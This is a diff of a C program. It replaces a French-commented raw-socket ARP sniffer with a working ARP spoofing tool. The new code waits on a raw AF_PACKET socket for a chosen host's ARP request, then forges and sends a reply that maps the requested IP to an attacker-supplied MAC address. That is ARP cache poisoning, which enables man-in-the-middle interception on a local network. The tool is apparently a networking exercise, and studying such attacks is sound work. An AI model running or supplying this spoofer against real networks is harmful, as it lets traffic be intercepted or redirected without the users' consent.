@@ -1,143 +1,208 @@
-#include "main.h"
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdbool.h>
+#include <string.h>
+#include <unistd.h>
+#include <ifaddrs.h>
+#include <net/if.h>
+#include <arpa/inet.h>
+#include <linux/if_packet.h>
+#include <netinet/if_ether.h>
+#include <netinet/in.h>
+#include <netinet/ether.h>
 
-//Detaille d'une trame arp (hexadecimal) taille max 1500 octects (a la fin possible padding (0000000000)):
-// |----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
-// |                                                                      Entete ethernet                                                                                    |                                                                                                                                                                                                                                                                                                                                               Entete ARP                                                                                                                                                                                                                                                                                                                       |
-// |----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
-// | Adresse MAC de Destination du paquet (6 octect) | Adresse MAC de l'emetteur du paquet (6 octect) | Type de protocole encapsule dans la trame (2 octects) (Pour arp 0806) | Type d'operation (2 octects) (0001 pour request ARP et 0002 pour reponse) | Type de protocole reseau en general IPv4 (2 octects) (0800 pour IPv4) |  Longueur adresse MAC en octect (1 octect) (en general 06) | Longueur adresse IP en octect (1 octect 04) | Opcode (2 octects) | Adresse MAC de l'émetteur de la requête ou de la réponse (6 octect en focntion de precedent) | Adresse IP de l'émetteur de la requête ou de la réponse (4 octect en focntion de precedent) | Adresse MAC du destinataire de la requête ou de la réponse Inconnue et remplie de zéros dans une requête (6 octects) | Adresse IP du destinataire de la requête ou de la réponse (4 octects) |
-// |----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
-// |                FF FF FF FF FF FF                |               02 42 AC 1A 00 03                |                                  08 06                                |                                     00 01                                 |                                  08 00                                |                               06                           |                       04                    |       00 01        |                                        02 42 AC 1A 00 03                                     |                                       AC 1A 00 03                                           |                                                   00 00 00 00 00 00                                                  |                             AC 1A 00 01                               |
-// |----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
+#define BUFFER_SIZE ETH_FRAME_LEN
 
-//Detail de la structure sockaddr_ll : 
-//struct sockaddr_ll{
-//  unsigned short ssl_family (famille d'adresse de la socket normalement toujours AF_PACKET)
-//  unsigned short ssl_protocol (Protocol de la couche 2 pour lequel cette adresse s'applique (htons(ETH_P_ALL)))
-//  int ssl_ifindex (interface reseau sur laquelle la trame est recu. Pour voir les interfaces et leurs numero sur un systeme on utilise ip link show)
-//  unsigned short sll_hatype (Type de matériel associé à l'adresse. Par exemple, pour Ethernet, cela peut être ARPHRD_ETHER)
-//  unsigned char sll_pkttype (Type de paquet associé à l'adresse. Il peut s'agir de types de paquets spécifiques tels que PACKET_HOST, PACKET_BROADCAST, PACKET_MULTICAST)
-//  unsigned char sll_halen (Longueur de l'adresse mac en octect)
-//  unsigned char sll_addr[8] (Tableau contenant l'adresse mac. La taille du tableau est sll_halen)
-//}
+enum {
+	SUCCESS,
+	ARGUMENT_FAILURE,
+	INVALID_IP_FAILURE,
+	INVALID_MAC_FAILURE,
+	SOCKET_FAILURE,
+	GETIFADDRS_FAILURE,
+	RECVFROM_FAILURE,
+	SENDTO_FAILURE,
+};
 
-struct sockaddr_ll convert_to_sockaddr_ll(const struct sockaddr addr)
-{
-    struct sockaddr_ll addr_ll;
-    addr_ll = *(struct sockaddr_ll*)&addr;
-    return (addr_ll);
+void bzero(void *s, size_t n) {
+	while (n--) * (char *) s++ = 0;
 }
 
-
-void print_addr_ll(const struct sockaddr_ll sll)
-{
-        printf("sll_family : %s\n", (sll.sll_family == AF_PACKET) ? "AF_PACKET" : "AUTRES" );
-        printf("sll_protocol : %s\n", (htons(sll.sll_protocol) == ETH_P_ARP) ? "ARP" : "AUTRES");
-        printf("sll_ifindex : %d\n", sll.sll_ifindex);
-        printf("sll_hatype : %s\n", (sll.sll_hatype == ARPHRD_ETHER) ? "Adresse Ethernet" : (sll.sll_hatype == ARPHRD_IEEE80211) ? "Adresse WiFI" : (sll.sll_hatype == ARPHRD_LOOPBACK) ? "Interface LoopBack" : "");
-        printf("sll_pktype Packet %s\n", (sll.sll_pkttype == PACKET_HOST) ? "pour : hote local" : (sll.sll_pkttype == PACKET_BROADCAST) ? " pour : broadcast" : (sll.sll_pkttype == PACKET_MULTICAST) ? "pour : multicast" : (sll.sll_pkttype == PACKET_OTHERHOST) ? "pour : autre interface sur reseau local" : (sll.sll_pkttype == PACKET_OUTGOING) ? "envoye par hote local" : "");
-        printf("sll_halen (Taille adresse MAC en octect): %d octect\n", sll.sll_halen);
-        printf("sll_addr (Adresse MAC): %s\n", ether_ntoa((struct ether_addr *)sll.sll_addr));
+bool is_valid_ip(char const * const ip) {
+	int i = 0;
+	for (int j = 0; j < 4; j++) {
+		while (ip[i] && '0' <= ip[i] && ip[i] <= '9') i++;
+		if (j != 3 && ip[i++] != '.') return false;
+	}
+	if (ip[i]) return false;
+	return true;
 }
 
-// Transform data en binaire
-//Je met le bit en position la plus faible et je le compare avec 1 donc je l'extrait et ensuite je le met dans une string d'ou le +48
-// Dans cette fonction je vais extraire bit par bit ce que j'ai recu dans recvfrom donc je decale le chaque bit de chaque octect pour le mettre en position la plus faible
-// Et ensuite avec le AND 1 je l'extrait et comme je le met dans une chaine de caractere je fais +48
-void converToBinary(char *data, int length) {
-    char binTrame[SIZE_MAX_ARP];
-    int i = 0, k = 0;
-    for (; i < length; ++i) {
-        for (int j = 7; j >= 0; --j) {
-            binTrame[k++] = ((data[i] >> j) & 1) + 48;
-        }
-    }
-    binTrame[k] = '\0';
-    ft_strcpy(data, binTrame);
+bool is_valid_mac(char const * const mac) {
+	int i = 0;
+	for (int j = 0; j < 6; j++) {
+		while (mac[i] && (
+				('0' <= mac[i] && mac[i] <= '9') ||
+				('a' <= mac[i] && mac[i] <= 'f'))) i++;
+		if (j != 5 && mac[i++] != ':') return false;
+	}
+	if (mac[i]) return false;
+	return true;
 }
 
-void binaryToHex(char *binStr) {
-    char hexStr[SIZE_MAX_ARP];
-    int i = 0, j = 0, tot = 0;
-    while(binStr[i] != '\0')
-    {
-        if(i % 4 == 0)
-            tot = 0;
-        if (binStr[i] == '1')
-        {
-            if((i + 1) % 4 == 0)
-                tot = tot + 1;
-            else if((i + 1) % 4 == 3)
-                tot = tot + 2;
-            else if((i + 1) % 4 == 2)
-                tot = tot + 4;
-            else if((i + 1) % 4 == 1)
-                tot = tot + 8;
-        }
-        if((i + 1) % 4 == 0)
-            hexStr[j++] = "0123456789ABCDEF"[tot];
-        i++;
-    }
-    hexStr[j] = '\0';
-    ft_strcpy(binStr, hexStr);
+void parseMacAddress(char const * const source_mac, char * const mac) {
+	char base[] = "0123456789abcdef";
+	char * a = strtok((char *) source_mac, ":");
+
+	bzero(mac, 6);
+
+	for (int i = 0; i < 6; i++) {
+		mac[i] += (strchr(base, a[0]) - base) * 16;
+		mac[i] += (strchr(base, a[1]) - base);
+		a = strtok(NULL, ":");
+	}
 }
 
-int main(int argc, char **argv)
-{
-    if (argc != 5)
-    {
-        return(printf("Wrong number arguments \n"), 1);
-        return (1);
-    }
-    argv[0] = argv[0];
-    char buf[SIZE_MAX_ARP];
-    struct sockaddr addr;
-    struct sockaddr_ll addr_ll;
-    socklen_t len = sizeof(addr);
+int main(int argc, char **argv) {
 
-    //Pour recuperer toutes les communications qui arrive sur notre machine on utilise des RAW Sockets qui vont permettre de manipuler/composer
-    //soi-meme la partie IP du modele OSI. Avec des sockets normal on peut aussi agir sur cette partie mais pas autant on sera plutot sur la partie 4 du modele OSI.
-    //On va pouvoir aussi avec ce genre de socket recuperer les requetes broadcast et multicast.
-    int sockRaw;
+	if (argc != 5) {
+		printf("Usage: %s <source ip> <source mac address> <target ip> <target mac address>\n", argv[0]);
+		return ARGUMENT_FAILURE;
+	}
 
-    //Pour creer une RAW socket on donne a socket comme type (2eme arg) SOCK_RAW. Comme domaine (1er arg) AF_PACKET qui va permettre d'accerder au donnes brut
-    //incluant les entetes ethernet (couche 2 modele OSI) et IP (couche 3 modele OSI). Ensuite on renseigne le protocol ce sera le type de trame que l'on veut
-    //'capturer' il en existe plusieur pour le trame IP, ARP, VLAN et il existe un moyen de tout capturer (ETH_P_ALL) on utilisera ETH_P_ARP pour les trames ARP
-    // car il n y'a que celle ci qui nous interesse. Mais typiquement les logiciels de sniffing tel que wireshark utilise ETH_P_ALL. Le kernel a chaque fois
-    //qu'il recoit une trame et qu'elle doit aussi aller a notre socket cree un copie de cette trame et l'envoie a la socket.
-    //REF (https://stackoverflow.com/questions/62866943/how-does-the-af-packet-socket-work-in-linux et man 7 packet et linux/if_ether.h)
-    sockRaw = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
+	for (int i = 0; i < 2; i++) {
+		if (!is_valid_ip(argv[2 * i + 1])) {
+			printf("Invalid IP address: %s\n", argv[2 * i + 1]);
+			return INVALID_IP_FAILURE;
+		}
+		if (!is_valid_mac(argv[2 * i + 2])) {
+			printf("Invalid MAC address: %s\n", argv[2 * i + 2]);
+			return INVALID_MAC_FAILURE;
+		}
+	}
 
-    printf("%d\n", sockRaw);
-    if (sockRaw < 0)
-    {
-        printf("socket failed : %s\n", strerror(errno));
-        return(1);
-    }
-    while(1)
-    {
-        memset(buf, 0, sizeof(buf));
-        //On utilise recvfrom qui est comme recv mais avec pour particulariter de remplir la structure addr avec les informations de l'expediteur du message
-        //recu ca sera utile pour la suite pour envoyer un message a l'expediteur.
-        //sockaddr est concu pour gerer different type de socket donc c'est une structure generique alors que sockaddr_ll est specifique au adresse de niveau 2
-        //(Couche liaison du modele OSI) et fonctionne specifiquement avec AF_PACKET comme recvfrom est une focntion qui doit pouvoir marcher avec different type
-        //Elle prend comme argument sockaddr. Mais ensuite si on est sur d'utiliser AF_PACKET on pourra converti/caster sockaddr en sockaddr_ll et dans sockaddr_ll
-        //On a enfaite les information ethernet et dans la trame les informations IP
-        int recv = recvfrom(sockRaw, buf, SIZE_MAX_ARP, 0, &addr, &len);
-        if (recv <= 0)
-        {
-            printf("recvfrom failed : %s\n", strerror(errno));
-            return (1);
-        }
-        addr_ll = convert_to_sockaddr_ll(addr);
-        print_addr_ll(addr_ll);
-        printf("Data : ");
-        converToBinary(buf, recv);
-        binaryToHex(buf);
-        printf("%s\n", buf);
-        printf("\n");
-        printf("\n");
-        fflush(stdout);
-        memset(buf, 0, sizeof(buf));
-    }
-    return(0);
+	char const * const source_ip  = argv[1];
+	char const * const source_mac = argv[2];
+	char const * const target_ip  = argv[3];
+	char const * const target_mac = argv[4];
+
+	int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+
+	if (sock == -1) {
+		perror("socket");
+		return SOCKET_FAILURE;
+	}
+
+	struct ifaddrs * addresses, * address;
+	char interface[100];
+
+	if (getifaddrs(&addresses) == -1) {
+		perror("getifaddrs");
+		return GETIFADDRS_FAILURE;
+	}
+
+	for (address = addresses; address != NULL; address = address->ifa_next) {
+		if (address->ifa_addr == NULL) continue;
+		if (address->ifa_addr->sa_family != AF_PACKET) continue;
+		if (strcmp(address->ifa_name, "lo") == 0) continue;
+		strcpy(interface, address->ifa_name);
+		break;
+	}
+
+	freeifaddrs(addresses);
+	printf("Interface: %s\n", interface);
+
+	ssize_t bytes_read;
+	struct sockaddr saddr;
+	socklen_t saddr_len = sizeof(saddr);
+	char buffer[BUFFER_SIZE];
+
+
+	printf("Waiting for ARP request (from %s to %s)...\n", target_ip, source_ip);
+
+	while (true) {
+
+		// Request
+
+		bytes_read = recvfrom(sock, buffer, BUFFER_SIZE, 0, &saddr, &saddr_len);
+
+		if (bytes_read == -1) {
+			perror("recvfrom");
+			return RECVFROM_FAILURE;
+		}
+
+		bzero(buffer + bytes_read, BUFFER_SIZE - bytes_read);
+
+		struct ether_header const * const eth = (struct ether_header *) buffer;
+		struct arphdr const * const arp = (struct arphdr *) (buffer + sizeof(struct ether_header));
+
+		if (ntohs(eth->ether_type) != ETHERTYPE_ARP) continue;
+		if (ntohs(arp->ar_op) != ARPOP_REQUEST) continue;
+
+		char _source_ip[INET_ADDRSTRLEN];
+		inet_ntop(AF_INET, buffer + sizeof(struct ether_header) + sizeof(struct arphdr) + 6, _source_ip, INET_ADDRSTRLEN);
+		if (strcmp(target_ip, _source_ip) != 0) continue;
+
+		char _source_mac[18];
+		ether_ntoa_r((struct ether_addr *) (buffer + sizeof(struct ether_header) + 8), _source_mac);
+		if (strcmp(target_mac, _source_mac) != 0) continue;
+
+		char _target_ip[INET_ADDRSTRLEN];
+		inet_ntop(AF_INET, buffer + sizeof(struct ether_header) + sizeof(struct arphdr) + 16, _target_ip, INET_ADDRSTRLEN);
+		if (strcmp(source_ip, _target_ip) != 0) continue;
+
+		printf("ARP request received\n");
+
+		// Response
+
+		char reply[BUFFER_SIZE];
+		struct ether_header * const eth_reply = (struct ether_header *) reply;
+		struct arphdr * const arp_reply = (struct arphdr *) (reply + sizeof(struct ether_header));
+
+		bzero(reply, BUFFER_SIZE);
+
+		eth_reply->ether_type = htons(ETHERTYPE_ARP);
+		memcpy(eth_reply->ether_dhost, eth->ether_shost, ETH_ALEN);
+		memcpy(eth_reply->ether_shost, eth->ether_dhost, ETH_ALEN);
+
+		arp_reply->ar_hrd = htons(ARPHRD_ETHER);
+		arp_reply->ar_pro = htons(ETHERTYPE_IP);
+		arp_reply->ar_hln = ETH_ALEN;
+		arp_reply->ar_pln = 4;
+		arp_reply->ar_op  = htons(ARPOP_REPLY);
+
+		socklen_t saddr_ll_len = sizeof(struct sockaddr_ll);
+		struct sockaddr_ll saddr_ll;
+		bzero(&saddr_ll, saddr_ll_len);
+
+		saddr_ll.sll_family = AF_PACKET;
+		saddr_ll.sll_ifindex = if_nametoindex(interface);
+		saddr_ll.sll_protocol = htons(ETH_P_ALL);
+
+		if (ntohs(eth_reply->ether_type) != ETHERTYPE_ARP) continue;
+		if (ntohs(arp_reply->ar_op) != ARPOP_REPLY) continue;
+
+		char mac[6];
+		parseMacAddress(source_mac, mac);
+
+		memcpy(reply + sizeof(struct ether_header) + sizeof(struct arphdr) + 6, buffer + sizeof(struct ether_header) + sizeof(struct arphdr) + 16, 4);
+		memcpy(reply + sizeof(struct ether_header) + sizeof(struct arphdr) + 16, buffer + sizeof(struct ether_header) + sizeof(struct arphdr) + 6, 4);
+		memcpy(reply + sizeof(struct ether_header) + 8, mac, ETH_ALEN);
+		memcpy(reply + sizeof(struct ether_header) + 18, buffer + sizeof(struct ether_header) + 8, ETH_ALEN);
+
+		ssize_t bytes_sent = sendto(sock, reply, sizeof(struct ether_header) + sizeof(struct arphdr) + 20, 0, (struct sockaddr *) &saddr_ll, saddr_ll_len);
+
+		if (bytes_sent == -1) {
+			perror("sendto");
+			return SENDTO_FAILURE;
+		}
+
+		printf("ARP response sent\n");
+		fflush(stdout);
+		break;
+
+	}
+
+	close(sock);
+	return 0;
 }
